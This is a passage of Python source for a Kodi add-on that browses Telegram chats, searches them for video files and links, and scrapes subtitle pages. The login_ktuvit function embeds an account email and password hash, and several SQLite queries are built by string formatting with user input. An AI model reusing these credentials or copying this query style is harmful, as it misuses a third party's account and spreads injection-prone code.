                aa=addDir3('[COLOR %s]'%color+name.encode('utf8')+'[/COLOR]',str(items),mode,icon,fanart,plot+'\nfrom_plot',generes=genere,data='0',last_id=last_id_fixed,image_master=icon+'$$$'+fanart,menu_leave=True,original_title=name)
                all_d.append(aa)
            
            counter+=1
    if items!='':
        last_id=str(items)+'$$$'+str(order)
        logging.warning('last_id:'+str(last_id))
        aa=addDir3('[COLOR khaki]'+Addon.getLocalizedString(32026)+'[/COLOR]',str(id),12,'https://sitechecker.pro/wp-content/uploads/2017/12/search-engines.png','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Next',data='all',last_id=last_id)
        all_d.append(aa)
    
    dp.close()
    return all_d
   except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN Main:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
def infiniteReceiverbackground(all_d,last_id):
    try:
        global exit_now

        
        logging.warning('sending')
        # dp = xbmcgui . DialogProgress ( )
        # dp.create('Please Wait...','Adding Groups', '','')
        # dp.update(0, 'Please Wait...','Adding Groups', '' )
       
        num=random.randint(0,60000)
        order=last_id.split('$$$')[1]
        leid=last_id.split('$$$')[0]
        data={'type':'td_send',
                 'info':json.dumps({'@type': 'getChats','offset_chat_id':leid,'offset_order':order, 'limit': '100', '@extra': num})
                 }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        exit_now=0
       
        if 'status' in event:
            xbmcgui.Dialog().ok('Error occurred',event['status'])
            exit_now=1
        if exit_now==0:
           

            
            
            counter=0
            counter_ph=10000
        
            j_enent_o=(event)
            zzz=0
            items=''
            for items in j_enent_o['chat_ids']:
                
                data={'type':'td_send',
                     'info':json.dumps({'@type': 'getChat','chat_id':items, '@extra':counter})
                     }
                event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
                if 'status' in event:
                    xbmcgui.Dialog().ok('Error occurred',event['status'])
                    exit_now=1
                    break
                
                order=event['order']
                
                # if dp.iscanceled():
                              # dp.close()
                             
                              # break
                j_enent=(event)
                
                # dp.update(int(((zzz* 100.0)/(len(j_enent_o['chat_ids']))) ), 'Please Wait...','Adding Groups', j_enent['@type'].encode('utf8') )
                if j_enent['@type']=='chat' and len(j_enent['title'])>1:
                    
                    icon_id=''
                    fan_id=''
                    fanart=''
                    icon=''
                    name=j_enent['title']
                    logging.warning(name+':'+str(items))
                    
                    color='white'
                    if 'is_channel' in j_enent['type']:
                        if j_enent['type']['is_channel']==False:
                            
                            genere='Chat'
                            color='lightblue'
                        else:
                            genere='Channel'
                            color='khaki'
                    else:
                         genere=j_enent['type']['@type']
                         color='lightgreen'
                    if 'last_message' in j_enent:
                        plot=name.encode('utf8')
                        pre=j_enent['last_message']['content']
                   
                        if 'caption' in pre:
                            plot=j_enent['last_message']['content']['caption']['text'].encode('utf8')
                        elif 'text' in pre:
                            if 'text' in pre['text']:
                                plot=j_enent['last_message']['content']['text']['text'].encode('utf8')
                        
                            
                    else:
                        plot=name.encode('utf8')
                    # dp.update(int(((zzz* 100.0)/(len(j_enent_o['chat_ids']))) ), 'Please Wait...','Adding Groups', name.encode('utf8') )
                    zzz+=1
                 
                    if 'photo' in j_enent:
                       
                       if 'small' in j_enent['photo']:
                         counter_ph+=1
                         icon_id=j_enent['photo']['small']['id']
                         f_name=str(j_enent['id'])+'_small.jpg'
                         mv_name=os.path.join(logo_path,f_name)
                         if os.path.exists(mv_name):
                            icon=mv_name
                         else:
                            icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                       if 'big' in j_enent['photo']:
                         counter_ph+=1
                         fan_id=j_enent['photo']['big']['id']
                         f_name=str(j_enent['id'])+'_big.jpg'
                         mv_name=os.path.join(logo_path,f_name)
                         if os.path.exists(mv_name):
                            fanart=mv_name
                         else:
                            fanart=download_photo(fan_id,counter_ph,f_name,mv_name)
                    mode=2
                    last_id_fixed='0$$$0$$$0$$$0'
                    # if 'group links' in name.lower() or 'ערוץ קישורים' in name or 'קישורים לכל הקבוצות' in name:
                        # mode=38
                        # color='olive'
                        # last_id_fixed='0'
                    # aa=addDir3('[COLOR %s]'%color+name.encode('utf8')+'[/COLOR]',str(items),mode,icon,fanart,plot+'\nfrom_plot',generes=genere,data='0',last_id=last_id_fixed,image_master=icon+'$$$'+fanart,menu_leave=True,original_title=name)
                    # all_d.append(aa)
                
                counter+=1
    except: pass
    # if items!='':
        # last_id=str(items)+'$$$'+str(order)
        # logging.warning('last_id:'+str(last_id))
        # aa=addDir3('[COLOR khaki]'+Addon.getLocalizedString(32026)+'[/COLOR]',str(id),12,'https://sitechecker.pro/wp-content/uploads/2017/12/search-engines.png','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Next',data='all',last_id=last_id)
        # all_d.append(aa)
    
    # dp.close()
    # return all_d
   # except Exception as e:
        # import linecache
        # exc_type, exc_obj, tb = sys.exc_info()
        # f = tb.tb_frame
        # lineno = tb.tb_lineno
        # filename = f.f_code.co_filename
        # linecache.checkcache(filename)
        # line = linecache.getline(filename, lineno, f.f_globals)
        # logging.warning('ERROR IN Main:'+str(lineno))
        # logging.warning('inline:'+str(line))
        # logging.warning(str(e))
        # xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
        
def my_groups(last_id):
    logging.warning('Start Main')
    try:
        
        all_d=[]
        aa=addDir3('[COLOR yellow]'+Addon.getLocalizedString(32024)+'[/COLOR]',str(id),6,'https://sitechecker.pro/wp-content/uploads/2017/12/search-engines.png','https://www.komando.com/wp-content/uploads/2017/12/computer-search.jpg','Search All',last_id='0$$$0',data='all')
        all_d.append(aa)
        all_d=infiniteReceiver(all_d,last_id)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
    except Exception as e:
        import linecache
        exc_type, exc_obj, tb = sys.exc_info()
        f = tb.tb_frame
        lineno = tb.tb_lineno
        filename = f.f_code.co_filename
        linecache.checkcache(filename)
        line = linecache.getline(filename, lineno, f.f_globals)
        logging.warning('ERROR IN Main:'+str(lineno))
        logging.warning('inline:'+str(line))
        logging.warning(str(e))
        xbmcgui.Dialog().ok('Error occurred','Err:'+str(e)+'Line:'+str(lineno))
def main_menu():
    logging.warning('Start Main')
    data={'type':'checklogin',
         'info':''
         }
    event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
    logging.warning(event)
    all_d=[]
    
    if event['status']==2 or event['status']=='Needs to log from setting':

        #Movies
        aa=addDir3(Addon.getLocalizedString(32020),str(id),10,'https://image.freepik.com/free-vector/click-movie-logo-vector_18099-274.jpg','https://image.tmdb.org/t/p/w500_and_h282_face/jOzrELAzFxtMx2I4uDGHOotdfsS.jpg','Movies')
        all_d.append(aa)
        #Tv Shows
        aa=addDir3('[COLOR lighblue]'+Addon.getLocalizedString(32021)+'[/COLOR]',str(id),11,'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQ48ZyMr013iwx2gXtSBm9iAcSkxv5ue5eJ16DEPXLCckXGcVRa','https://www.fanthatracks.com/wp-content/uploads/2019/08/themandalorian_disneyplus_SM_poster_cover.jpg','Tv Shows')
        all_d.append(aa)
        addNolink( '[COLOR lightgreen]%s[/COLOR]'%Addon.getLocalizedString(32001), 'www',5,False,fan="https://www.theseanamethod.com/wp-content/uploads/2017/01/login-570317_1280.jpg", iconimage="https://achieve.lausd.net/cms/lib/CA01000043/Centricity/domain/779/welligentbuttons/login.png")
        addNolink( '[COLOR red]%s[/COLOR]'%Addon.getLocalizedString(32019), 'www',21,False,fan="https://i.ytimg.com/vi/XlzVOc21PgM/maxresdefault.jpg", iconimage="https://pbs.twimg.com/profile_images/557854031930867712/cTa_aSs_.png")

        
        #xbmc.executebuiltin('Container.Refresh')
    else:


        # aa=addDir3('[I]---Last link Played---[/I]','www',144,'last.png','https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcT5GMHNjPCi4oCp4PHArgKQ-SBzF4wYdyRKbf0hj0t2qQxqffmO&usqp=CAU','Last Played') 
        # all_d.append(aa)
        #TEST
        # aa=addDir3('test','www',38,'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX','https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX',Addon.getLocalizedString(32127))
        
        # all_d.append(aa)
        
        
        
        aa=addDir3('VIP',str(id),129,'https://cdn4.vectorstock.com/i/1000x1000/04/68/vip-club-label-with-crown-in-modern-speech-bubble-vector-23720468.jpg','https://cdn4.vectorstock.com/i/1000x1000/04/68/vip-club-label-with-crown-in-modern-speech-bubble-vector-23720468.jpg','Movies')
        all_d.append(aa)
        #Movies
        aa=addDir3(Addon.getLocalizedString(32020),str(id),10,'https://seeklogo.com/images/M/movie-time-cinema-logo-8B5BE91828-seeklogo.com.png','https://image.tmdb.org/t/p/w500_and_h282_face/jOzrELAzFxtMx2I4uDGHOotdfsS.jpg','Movies')
        all_d.append(aa)
        #Tv Shows
        aa=addDir3(Addon.getLocalizedString(32021),str(id),11,'https://i.pinimg.com/originals/2e/00/76/2e00766ced490a713170272edbb51c3b.png','https://www.fanthatracks.com/wp-content/uploads/2019/08/themandalorian_disneyplus_SM_poster_cover.jpg','Tv Shows')
        all_d.append(aa)


        
        # https://www.kindpng.com/picc/m/79-790463_search-icon-search-button-png-icon-transparent-png.png
        aa=addDir3(Addon.getLocalizedString(32027),str(id),113,'https://lh5.googleusercontent.com/proxy/-RGejAHqTw0SEl8o3_eK3abBTFCoR49bh780mJ-HX2kK_Qf0aeTzeKuN_WHmW5wOZzKEmlsHE684lxp8BNbejnLx-S4S7dJDeCea3ESPCPMrkUucyFXNH5F_4iktdqh7vKfE5QNGtMZF6QAwAGknYp6v8oeRQg','https://cdn.ilovefreesoftware.com/wp-content/uploads/2019/06/Search-Telegram-Channels.png','Search All',last_id='0$$$0',data='all')
        all_d.append(aa)
        aa=addDir3('המשך צפיה','both',158,'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcT5GMHNjPCi4oCp4PHArgKQ-SBzF4wYdyRKbf0hj0t2qQxqffmO&usqp=CAU','https://www.york.ac.uk/media/study/courses/postgraduate/centreforlifelonglearning/English-Building-History-banner-bought.jpg','TMDB')
        all_d.append(aa)
        #My Groups
        aa=addDir3(Addon.getLocalizedString(32022),str(id),12,'https://live-timely-3b83c23740.time.ly/wp-content/uploads/2015/11/community-icon.png','https://buytelegrammember24.com/wp-content/uploads/2019/01/Screen-Shot-2019-01-14-at-9.45.41-AM.png','My Groups',last_id='0$$$9223372036854775807')
        all_d.append(aa)
        

        if len(Addon.getSetting("update_chat_id"))>0:
            #my repo
            aa=addDir3(Addon.getLocalizedString(32127),'www',46,'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX','https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX',Addon.getLocalizedString(32127))
            all_d.append(aa)
        
        try:
            from sqlite3 import dbapi2 as database
        except:
            from pysqlite2 import dbapi2 as database
        cacheFile=os.path.join(user_dataDir,'database.db')
        dbcon = database.connect(cacheFile)
        dbcur = dbcon.cursor()
        dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""tmdb TEXT, ""year TEXT, ""icon TEXT,""fan TEXT,""plot TEXT, ""free TEXT);" % 'custom_show')
        dbcon.commit()
        dbcur.execute("SELECT * FROM custom_show where tmdb='%s'"%(url))
        match = dbcur.fetchall()
        
        
        if len(match)==0:
          #My Local Tv shows
          aa=addDir3(Addon.getLocalizedString(32055),'www',28,'http://oakhillcapital.com/wp-content/uploads/2015/08/LocalTV.jpg','http://coldshotproductions.net/flachannelbanner.png',Addon.getLocalizedString(32055))
          #all_d.append(aa)
        #Full data groups
        aa=addDir3(Addon.getLocalizedString(32079),'www',33,'https://pngimage.net/wp-content/uploads/2018/05/asociacion-png-1.png','https://cdn.pixabay.com/photo/2015/04/23/22/00/tree-736885__340.jpg',Addon.getLocalizedString(32079))
        all_d.append(aa)
        #Kids World
        aa=addDir3(Addon.getLocalizedString(32073),'www',31,'https://americaniconstemeple.files.wordpress.com/2014/02/disney-logo3.jpg','https://insidethemagic-119e2.kxcdn.com/wp-content/uploads/2018/08/Expo19_11x16_Poster_KeyArt_72dpi-1-792x400.jpg',Addon.getLocalizedString(32073),data=KIDS_CHAT_ID2)
        #all_d.append(aa)
        aa=addDir3('הוסף מאגר קבוצות','www',132,'https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX','https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX',Addon.getLocalizedString(32127))
        
        all_d.append(aa)
        aa=addDir3('התקנת הרחבות','www',134,'https://assets.zorincdn.com/images/help/install.png','https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcQIwWK-VueyRxXcVVKGdMuUeDDeiUIsEN-8G-Tl-ZGOsBfrxvGX',Addon.getLocalizedString(32127))
        all_d.append(aa)
        dbcur.close()
        dbcon.close()
        # if not os.path.exists(os.path.join(user_dataDir, '4.2.0')):
         # joinrepo()
        # if not os.path.exists(os.path.join(user_dataDir, '4.2.0')):
            # #check_updated()
            # file = open(os.path.join(user_dataDir, '4.2.0'), 'w') 
             
            # file.write(str('Done'))
            # file.close()

        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
        #Addon updates
        if len(Addon.getSetting("update_chat_id"))>0:
          addNolink( '[COLOR lightblue][I]%s[/I][/COLOR]'%Addon.getLocalizedString(32124), 'www',45,False,iconimage='https://www.cig.co.com/wp-content/uploads/2016/01/update-icon.png',fan='https://www.hostinger.com/tutorials/wp-content/uploads/sites/2/2019/01/wordpress-auto-update.jpg')
        if not len(Addon.getSetting("update_chat_id"))>0:
         addNolink( '[COLOR lightblue][I]%s[/I][/COLOR]'%Addon.getLocalizedString(32124), 'www',133,False,iconimage='https://www.cig.co.com/wp-content/uploads/2016/01/update-icon.png',fan='https://www.hostinger.com/tutorials/wp-content/uploads/sites/2/2019/01/wordpress-auto-update.jpg')
        
def login_ktuvit():
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'he,he-IL;q=0.8,en-US;q=0.5,en;q=0.3',
        'Content-Type': 'application/json',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'https://www.screwzira.com',
        'Connection': 'keep-alive',
        'Referer': 'https://www.screwzira.com/',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
    }

    data = {'request':{'Email':'hatzel6969@gmail.com','Password':'Jw1n9nPOZRAHw9aVdarvjMph2L85pKGx79oAAFTCsaE='}}

    response = requests.post('https://www.screwzira.com/Services/MembershipService.svc/Login', headers=headers, json=data).cookies
    logging.warning(response)
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'he,he-IL;q=0.8,en-US;q=0.5,en;q=0.3',
    'Connection': 'keep-alive',
    'Referer': 'https://www.screwzira.com/',
    'Upgrade-Insecure-Requests': '1',
    'Pragma': 'no-cache',
    'Cache-Control': 'no-cache',
    'TE': 'Trailers',
    }
    cookies={}
    cook=[]
    for cookie in response:
         cook.append(cookie.name+'='+cookie.value)
         cookies[cookie.name]=cookie.value
    logging.warning(cookies)
    response = requests.get('https://www.screwzira.com/', headers=headers, cookies=cookies).cookies
    logging.warning(response)
    for cookie in response:
         cook.append(cookie.name+'='+cookie.value)
         cookies[cookie.name]=cookie.value
    return json.dumps(cookies)
def Movienotify():
   # time.sleep(0.1)
   xbmc.executebuiltin( "XBMC.ActivateWindow(10025,plugin://plugin.video.telemedia/?data=-1001000750206&dates=%20&description=%d7%a2%d7%95%d7%9c%d7%9d%20%d7%94%d7%a1%d7%a8%d7%98%d7%99%d7%9d&eng_name=%20&episode=%20&fanart=https%3a%2f%2fthumbs.dreamstime.com%2fb%2fhollywood-sign-postcard-california-illustration-vintage-hollywood-cinema-logo-design-movie-hollywood-sign-postcard-california-171714267.jpg&fav_status=false&heb_name=%20&iconimage=https%3a%2f%2fus.123rf.com%2f450wm%2fjagcz%2fjagcz1606%2fjagcz160600157%2f58409514-retro-film-production-accessories-still-life-concept-of-filmmaking-smoke-effect-on-background.jpg%3fver%3d6&id=%20&image_master&isr=0&last_id&mode=31&name=%d7%a1%d7%a8%d7%98%d7%99%d7%9d&original_title=%20&season=%20&show_original_year=%20&tmdbid=%20&url=www&quot;,return)" )
def last_tv_subs(url):
    #cookies_login=login_ktuvit()
    all_d=[]
    cookies_login=json.loads(cache.get(login_ktuvit,1, table='pages'))
    headers = {
        
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    logging.warning(url)
    
    x=requests.get(url,headers=headers,cookies=cookies_login).content
    logging.warning('Done')
    regex='<div class="col-md-12">(.+?)</span>'
    match=re.compile(regex,re.DOTALL).findall(x)
    logging.warning('DoneM1')

    for items in match:
        regex='<img src="(.+?)".+?<h3>(.+?)\((.+?)\)</h3>.+?<h4>עונה (.+?) פרק (.+?)</h4>.+?data-elipsis-hidden="true">(.+?)<.+?data-title="(.+?)"'
        m2=re.compile(regex,re.DOTALL).findall(items)
        if len(m2)>0:
            icon='https://www.screwzira.com'+m2[0][0]
            image=icon
            new_name=m2[0][1]
            original_title=m2[0][2]
            season=m2[0][3]
            episode=m2[0][4]
            plot=m2[0][5]
            id=m2[0][6]

            
            
            
            
            
            addDir4('[COLOR yellow] עונה %s פרק %s '%(season,episode)+'[/COLOR]'+new_name, url,20, icon,image,plot,original_title=original_title,season=season,episode=episode,data=year,eng_name=original_title,heb_name=new_name,id=id)
            # all_d.append(aa)
    regex='<li ><a href="(.+?)">הבא</a></li>'
    m3=re.compile(regex).findall(x)
    if len(m3)>0:
        aa=addDir3( '[COLOR yellow][I]הדף הבא[/I][/COLOR]', 'https://www.screwzira.com'+m3[0],119, 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTTNmz-ZpsUi0yrgtmpDEj4_UpJ1XKGEt3f_xYXC-kgFMM-zZujsg','https://cdn4.iconfinder.com/data/icons/arrows-1-6/48/1-512.png','הדף הבא')
        all_d.append(aa)
        xbmcplugin .addDirectoryItems(int(sys.argv[1]),all_d,len(all_d))
def res_q(quality):
    fk=Addon.getSetting("4k")
    fp=Addon.getSetting("1080p")
    fh=Addon.getSetting("720p")
    fm=Addon.getSetting("480p")
    fz=Addon.getSetting("360p")
    fx=Addon.getSetting("240p")
    f_q=' '
    if '4k' in quality.lower():
        quality='2160'
    if '2160' in quality and fk=='true':
      f_q='2160'
    elif '1080' in quality and fp=='true':
      f_q='1080'
    elif '720' in quality and fh=='true':
      f_q='720'
    elif '480' in quality and fm=='true':
      f_q='480'
    
    elif '360' in quality and fz=='true' or 'sd' in quality.lower() and fz=='true':
      f_q='360'
    elif '240' in quality and fx=='true':
      f_q='240'
    elif 'hd' in quality.lower() and fh=='true' or 'hq' in quality.lower() and fh=='true':
      f_q='720'
    elif '' in quality.lower() and fh=='true' or 'hq' in quality.lower() and fh=='true':
      f_q='unk'
    return f_q
    
def fix_q_links(quality):
    f_q=100
    if '4k' in quality.lower():
        quality='2160'
    if '2160' in quality:
      f_q=1
    elif '1080' in quality:
      f_q=2
    elif '720' in quality:
      f_q=3
    elif '480' in quality:
      f_q=4
    
    elif '360' in quality or 'sd' in quality.lower():
      f_q=5
    elif '240' in quality:
      f_q=6
    elif 'hd' in quality.lower() or 'hq' in quality.lower():
      f_q=3
    return f_q
def get_q(name):
    q=res_q(name)
    loc=fix_q_links(q)
    '''
    logging.warning('Q test:'+name)
    logging.warning('Q s:'+q)
    logging.warning('Q loc:'+str(loc))
    '''
    return q,loc
def searchtmdb(tmdb,type,last_id_pre,search_entered_pre,icon_pre,fan_pre,season,episode,no_subs=0,original_title='',heb_name='',dont_return=True,manual=True):
    import random
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""free TEXT);" % 'search')
    dbcon.commit()
        
    dbcur.execute("SELECT * FROM search")
    match_search = dbcur.fetchall()
    all_pre_search=[]
    for nm,fr in match_search:
        all_pre_search.append(nm)
    last_id=last_id_pre.split('$$$')[0]
    last_id_msg=last_id_pre.split('$$$')[1]
   
    
    if search_entered_pre=='Search All':
        search_entered=''
        
        #Enter Search
        keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
        keyboard.doModal()
        if keyboard.isConfirmed():
                query = keyboard.getText()
        else:
            return 0
    else:
        query=search_entered_pre
    query=query.replace('%20',' ').replace('%27',"'").replace('%3a',":")
    if query not in all_pre_search and manual:
        dbcur.execute("INSERT INTO search Values ('%s','%s');" %  (query.replace("'","%27"),' '))
        dbcon.commit()
    dbcur.close()
    dbcon.close()
    num=random.randint(1,1001)
    all_links=[]
    filter_size=int(Addon.getSetting("filter_size"))*1024*1024
    logging.warning(filter_size)
    filter_sizelimit=int(Addon.getSetting("filter_sizelimit"))*1024*1024
    

    
    
    
    
    if type=='all' and os.path.exists(os.path.join(xbmc.translatePath("special://userdata"),"addon_data", "plugin.video.telemedia/database","td.binlog")):
        data={'type':'td_send',
             'info':json.dumps({'@type': 'searchMessages', 'query': query,'offset_message_id':last_id,'offset_chat_id':last_id_msg,'limit':100, '@extra': num})
             }
        event=requests.post('http://127.0.0.1:%s/'%listen_port,json=data).json()
        
        
        counter_ph=0
        for items in event['messages']:  
            #logging.warning(items)
            
            if 'document' in items['content']:
                name=items['content']['document']['file_name']
                if '.mkv' not in name and '.mp4' not in name and '.avi' not in name:
                    continue
                size=items['content']['document']['document']['size']
                if size<filter_size:
                    continue
                if size>filter_sizelimit:
                    continue
                    
                    
                    
                    
                    
                    
                f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                
                q,loc=get_q(name)
                link_data={}
                link_data['id']=str(items['content']['document']['document']['id'])
                link_data['m_id']=items['id']
                link_data['c_id']=items['chat_id']
                f_lk=json.dumps(link_data)
                all_links.append((name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                #addLink( name, str(items['content']['document']['document']['id']),3,False, icon_pre,fan_pre,f_size2,data=data,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'video' in items['content']:
                    name=items['content']['video']['file_name']
                    
                    size=items['content']['video']['video']['size']
                    if size<filter_size:
                        continue
                    if size>filter_sizelimit:
                        continue
                    f_size2=str(round(float(size)/(1024*1024*1024), 2))+' GB'
                    logging.warning('items')
                    q,loc=get_q(name)
                    link_data={}
                    link_data['id']=str(items['content']['video']['video']['id'])
                    link_data['m_id']=items['id']
                    link_data['c_id']=items['chat_id']
                    f_lk=json.dumps(link_data)
                    all_links.append(( name, f_lk,3,q,loc, icon_pre,fan_pre,f_size2,no_subs,tmdb,season,episode,original_title))
                    #addLink( name, str(items['content']['video']['video']['id']),3,False, icon_pre,fan_pre,f_size2,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            if 'caption' in items['content']:
                    txt_lines=items['content']['caption']['text'].split('\n')
                    all_l=[]
                    name=txt_lines[0]
                    rem_lines=[]
                    for lines in txt_lines:
                        if 'upfile' not in lines and 'drive.google' not in lines:
                          rem_lines.append(lines)
                          continue
                        
                            
                        all_l.append(lines)
                    if len(all_l)==0:
                        continue
                    icon=icon_pre
                    fan=fan_pre
                    if 'photo' in items['content']['caption']:
                        counter_ph+=1
                        icon_id=items['content']['photo']['sizes'][0]['photo']['id']
                        f_name=items['content']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(icons_path,f_name)
                        if os.path.exists(mv_name):
                            icon=mv_name
                        else:
                           icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                        
                        counter_ph+=1
                        loc=items['content']['photo']['sizes']
                        icon_id=items['content']['photo']['sizes'][len(loc)-1]['photo']['id']
                        f_name=items['content']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                        mv_name=os.path.join(fan_path,f_name)
                        if os.path.exists(mv_name):
                            fan=mv_name
                        else:
                           fan=download_photo(icon_id,counter_ph,f_name,mv_name)
                           
                    q,loc=get_q(txt_lines[0])
                    all_links.append(('[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,q,loc, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                    #addLink( '[COLOR lightgreen]'+ txt_lines[0]+'[/COLOR]' , '$$$'.join(all_l),9,False, icon,fan,('\n'.join(rem_lines)).replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            elif 'web_page' in items['content']:
                name=items['content']['web_page']['title']
                link=items['content']['web_page']['url']
                plot=items['content']['web_page']['description']
                if 'upfile' not in link and 'drive.google' not in link:
                      
                      continue
                icon=icon_pre
                fan=fan_pre
                if 'photo' in items['content']['web_page']:
                    counter_ph+=1
                    icon_id=items['content']['web_page']['photo']['sizes'][0]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][0]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(icons_path,f_name)
                    if os.path.exists(mv_name):
                        icon=mv_name
                    else:
                       icon=download_photo(icon_id,counter_ph,f_name,mv_name)
                    
                    counter_ph+=1
                    loc=items['content']['web_page']['photo']['sizes']
                    icon_id=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['id']
                    f_name=items['content']['web_page']['photo']['sizes'][len(loc)-1]['photo']['remote']['id']+'.jpg'
                    mv_name=os.path.join(fan_path,f_name)
                    if os.path.exists(mv_name):
                        fan=mv_name
                    else:
                       fan=download_photo(icon_id,counter_ph,f_name,mv_name)
              
                q,loc=get_q(name)
                
                all_links.append(('[COLOR lightgreen]'+ name+'[/COLOR]', link,9,q,loc, icon,fan,plot.replace('\n\n','\n'),no_subs,tmdb,season,episode,original_title))
                #addLink( '[COLOR lightgreen]'+ name+'[/COLOR]', link,9,False, icon,fan,plot.replace('\n\n','\n'),no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
            f_id=items['chat_id']
    else:
        ADDONTITLE2='יש להגדיר את חשבון הטלמדיה שלכם'
        DIALOG         = xbmcgui.Dialog()
        choice = DIALOG.yesno(ADDONTITLE2, "האם תרצה להגדיר אותו עכשיו?", yeslabel="[B][COLOR white]כן[/COLOR][/B]", nolabel="[B][COLOR white]לא[/COLOR][/B]")
        if choice == 1:
            xbmc.executebuiltin( "RunPlugin(plugin://plugin.video.telemedia?mode=5&url=www)" )
            
        else:
         sys.exit()
    if dont_return:
        all_links=sorted(all_links, key=lambda x: x[4], reverse=False)
        filter_dup=Addon.getSetting("dup_links")=='true'
        all_t_links=[]
        for  name, link,mode,q,loc, icon,fan,plot,no_subs,tmdb,season,episode,original_title in all_links:
            
            if name not in all_t_links or filter_dup==False:
            
           
                all_t_links.append(name)
                addLink( name, link,mode,False, icon,fan,plot,no_subs=no_subs,tmdb=tmdb,season=season,episode=episode,original_title=original_title)
        try:
            last_id=str(items['id'])+'$$$'+str(f_id)
            
        except:
            #xbmc.executebuiltin(u'Notification(%s,%s)' % ('Telemedia', 'No result for:'+query))
            pass
    return all_links
def search(tmdb,type,last_id_pre,search_entered_pre,icon_pre,fan_pre,season,episode,no_subs=0,original_title='',heb_name='',dont_return=True,manual=True):
    import random
    try:
        from sqlite3 import dbapi2 as database
    except:
        from pysqlite2 import dbapi2 as database
    cacheFile=os.path.join(user_dataDir,'database.db')
    dbcon = database.connect(cacheFile)
    dbcur = dbcon.cursor()
    dbcur.execute("CREATE TABLE IF NOT EXISTS %s ( ""name TEXT, ""free TEXT);" % 'search')
    dbcon.commit()
        
    dbcur.execute("SELECT * FROM search")
    match_search = dbcur.fetchall()
    all_pre_search=[]
    menu=[]
    for nm,fr in match_search:
        all_pre_search.append(nm)
    last_id=last_id_pre.split('$$$')[0]
    last_id_msg=last_id_pre.split('$$$')[1]
   
    
    if search_entered_pre=='Search All':
        search_entered=''
        
        #Enter Search
        keyboard = xbmc.Keyboard(search_entered, Addon.getLocalizedString(32025))
        keyboard.doModal()
        if keyboard.isConfirmed():
                query = keyboard.getText()
        else:
            return 0
    else:
        query=search_entered_pre
